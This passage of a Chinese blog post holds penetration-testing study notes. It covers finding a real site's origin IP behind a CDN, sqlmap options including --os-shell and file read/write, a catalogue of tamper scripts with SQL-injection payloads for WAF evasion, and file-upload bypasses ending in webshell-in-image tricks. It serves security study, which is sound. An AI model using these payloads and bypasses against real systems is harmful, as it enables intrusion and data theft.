href="http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155" target="_blank" rel="external">http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155</a>“</p><p>  搜索这个IP上的全部服务和网站，显示全是5173.com结尾的域名，基本确认这是真实ip，且是5173.com的主要网站服务器。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252101_958.png" alt=""></p><p>  查看『218.11.3.155』上的所有网站和服务</p></li></ul><h3 id="收集敏感目录"><a href="#收集敏感目录" class="headerlink" title="收集敏感目录"></a>收集敏感目录</h3><p>spinder.py、<a href="http://www.webscan.cc/、dirbuster" target="_blank" rel="external">http://www.webscan.cc/、dirbuster</a></p><h2 id="第2章-搭建漏洞环境及实战"><a href="#第2章-搭建漏洞环境及实战" class="headerlink" title="第2章 搭建漏洞环境及实战"></a><strong>第2章 搭建漏洞环境及实战</strong></h2><p>白帽子在目标对象不知情或者没有得到授权的情况下发起的渗透攻击是非法行为，所以我们通常会搭建一个有漏洞的Web应用程序，以此来练习各种各样的安全渗透技术。本章主要介绍了Linux系统下的LANMP﹑Windows系统下的WAMP应用环境的搭建，DVWA漏洞平台﹑SQL注入平台﹑XSS测试平台等常用渗透测试漏洞练习平台的安装配置及实战。</p><h2 id="第3章-常用工具"><a href="#第3章-常用工具" class="headerlink" title="第3章 常用工具"></a><strong>第3章 常用工具</strong></h2><p>“工欲善其事，必先利其器”，在日常的渗透测试中，借助一些工具，白帽子可以更高效地执行安全测试，这能极大地提高工作的效率和成功率。本章详细介绍了黑客常用的三大神器SQLMap﹑Burp Suite﹑Nmap的安装﹑入门和实战利用，实为“居家旅行”﹑渗透测试之必备工具。</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>–os-shell –os-shell 运行任意系统操作命令</p><p>sqlmap -u “url” –file-read “C:/example.exe” -v 1 从数据可服务器中读取文件</p><p>–file-write –file-dest :上传文件到数据服务器中</p><p>–identify -waf 是否有安全防护 （waf/IDS/IPS）</p><p>sqlmap tamper：</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><blockquote><p>sqlmap.py XXXXX -tamper “模块名”</p></blockquote><h3 id="各个-tamper-的作用"><a href="#各个-tamper-的作用" class="headerlink" title="各个 tamper 的作用"></a>各个 tamper 的作用</h3><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote><p>return payload.replace(‘\’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>apostrophemask.py 用UTF-8全角字符替换单引号字符 ，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1  <strong>to</strong>     1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote><p>return payload.replace(‘\’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1     <strong>to</strong>     1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1    <strong>to</strong>    1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1     <strong>to</strong>    MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：<code>C:\Python\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B    <strong>to</strong>    1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B    <strong>to</strong>    1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em> from users where id = 1    <strong>to</strong>    union%09select </em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload </p><blockquote><p>select <em> from users    <em>*to</em></em>    %2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p><blockquote><p>select <em> from users    <em>*to</em></em>    %73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select <em> from users    <em>*to</em></em>    \u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1    <strong>to</strong>    limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1)    <strong>to</strong>    mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote><p>retVal = re.sub(r”\b(\w+)(“, “\g<1>/**/(“, retVal)</1></p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name)    <strong>to</strong>    union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2)    <strong>to</strong>    concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote><p>retVal = re.sub(r”\s<em>=\s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em> from users where id=1    <strong>to</strong>    select </em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote><p>return payload.replace(“‘“, “\’”).replace(‘“‘, ‘\”‘)</p></blockquote><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+    <strong>to</strong>    1\‘ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b    <strong>to</strong>    1 and greatest(a,b+1)=a</p></blockquote><p>ALL</p><h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2    <strong>to</strong>    /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><blockquote><p>return re.sub(r”[^\w]”, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+    <strong>to</strong>    &#49;&#39;&#32;&#97;&#110;&#100;&#32;&#49;&#61;&#49;&#45;&#45;&#43;</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2)    <strong>to</strong>    if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “\g<1>/**/.”, payload)</1></p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from information_schema.tables    <strong>to</strong>    select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT    <strong>to</strong>    union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union         select       1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+    <strong>to</strong>    uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1    <strong>to</strong>    select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em> from users    <strong>to</strong>    %s%e%l%e%c%t </em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+    <strong>to</strong>    UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+    <strong>to</strong>    un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1    <strong>to</strong>    1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote><p>retVal = “%s%ssp<em>password” % (payload, “– “ if not any(</em> if <em> in payload else None for </em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’  and 1=1–+    <strong>to</strong>    1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+    <strong>to</strong>    union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py：        union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2–+</p><p>space2morehash.py：union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong>    union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote><p>retVal = re.sub(r”(?i)\bAND\b”, “%26%26”, re.sub(r”(?i)\bOR\b”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1    <strong>to</strong>    1 %26%26 1=1</p><p>1 or 1=1    <strong>to</strong>    1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+    <strong>to</strong>    union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1    <strong>to</strong>    1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p><blockquote><p>union select    <strong>to</strong>    UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#    </p></blockquote><p><strong>to</strong>    </p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p><h2 id="第4章-Web安全原理剖析"><a href="#第4章-Web安全原理剖析" class="headerlink" title="第4章 Web安全原理剖析"></a><strong>第4章 Web安全原理剖析</strong></h2><p>Web渗透的核心技术包括SQL注入﹑XSS攻击﹑CSRF攻击﹑SSRF攻击﹑暴力破解﹑文件上传﹑命令执行漏洞攻击﹑逻辑漏洞攻击﹑XXE漏洞攻击和WAF绕过等。本章依次将这些常见高危漏洞提取出来，从原理到利用，从攻击到防御，一一讲解。</p><p>●    SQL注入漏洞，讨论各种攻击手法，从最明显﹑最简单的方法到一系列高级攻击技巧，包括SQL注入绕过技术；</p><p>●    XSS攻击，讲解了XSS的形成原理﹑三种XSS类型﹑XSS常用语句﹑XSS编码绕过以及任何使用XSS平台测试XSS，最后提出了对XSS漏洞的修复意见；</p><p>以及CSRF漏洞﹑SSRF漏洞﹑XXE漏洞﹑暴力破解漏洞﹑命令执行漏洞﹑文件上传漏洞﹑逻辑漏洞的形成原理﹑漏洞利用﹑代码分析，以及要如何对它们进行修复。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="sql注入中tips"><a href="#sql注入中tips" class="headerlink" title="sql注入中tips"></a>sql注入中tips</h3><p>布尔型注入使用burp爆破以代替手注</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252114_327.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252113_363.png" alt=""></p><p>宽字节注入原因：</p><p>数据库使用GBK，被转义符转义，</p><p>加上%df。反斜杠是%5c,连接再一起%df%5c</p><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>id=1</p><p>变为id=MQ%3d%3d</p><p>访问1’即为id=MSc%3d 注入的语句都使用base64编码</p><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>x-forward-for注入</p><p>代码分析</p><p>php中的getenv()函数用于获取一个环境变量的值，类似于<code>$_server或者$_ENV</code>返回环境变量对应的值，如果环境变量不存在则返回false</p><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>And Order </p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>anandd绕过and过滤</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>url全编码</p><p>两次url全编码</p><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><pre><code>/*!and*/</code></pre><h3 id="sql防御"><a href="#sql防御" class="headerlink" title="sql防御"></a>sql防御</h3><p>1.过滤危险字符</p><p>2.使用预编译</p><p>pdo预编译</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>dom xss是基于dom文档对象模型的</p><p>xss绕过编码：js编码，html实体编码，url编码</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>有些Apache允许解析其他文件后缀的，例如在http.conf中，如果配置如下代码</p><pre><code>AddType application/x-httpd-php .php .phtml</code></pre><p>所以可以上传一个后缀为phtml的Webshell。</p><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h4 id="文件截断绕过"><a href="#文件截断绕过" class="headerlink" title="文件截断绕过"></a>文件截断绕过</h4><p>截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p><p>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p><p>实际操作：1.php%00.jpg</p><p>选中%00进行url编码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p><p>或者 test.asp .jpg 去burp hex中20更改00</p><h4 id="服务端检测绕过-文件类型MIME-类型检测"><a href="#服务端检测绕过-文件类型MIME-类型检测" class="headerlink" title="服务端检测绕过(文件类型MIME 类型检测)"></a>服务端检测绕过(文件类型MIME 类型检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071824_866.png" alt=""></p><p>修改Content-Type 为image/jpeg</p><h4 id="服务端验证绕过-文件完整性检测"><a href="#服务端验证绕过-文件完整性检测" class="headerlink" title="服务端验证绕过(文件完整性检测)"></a>服务端验证绕过(文件完整性检测)</h4><p>- 文件头检测 主要是在文件内容开始设置好图片文件的幻数 要绕过 jpg 文件检测就要在文件开头写上下图的值</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808281727_203.png" alt=""></p><p>在php中还存在一种类似的文件上传绕过，php函数getimagesize(可以获取图片的宽高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</p><p>但是可以讲一个图片和一个webshell合并为一个文件，例如使用以下命令，</p><p>cat image.png webshell.php &gt; 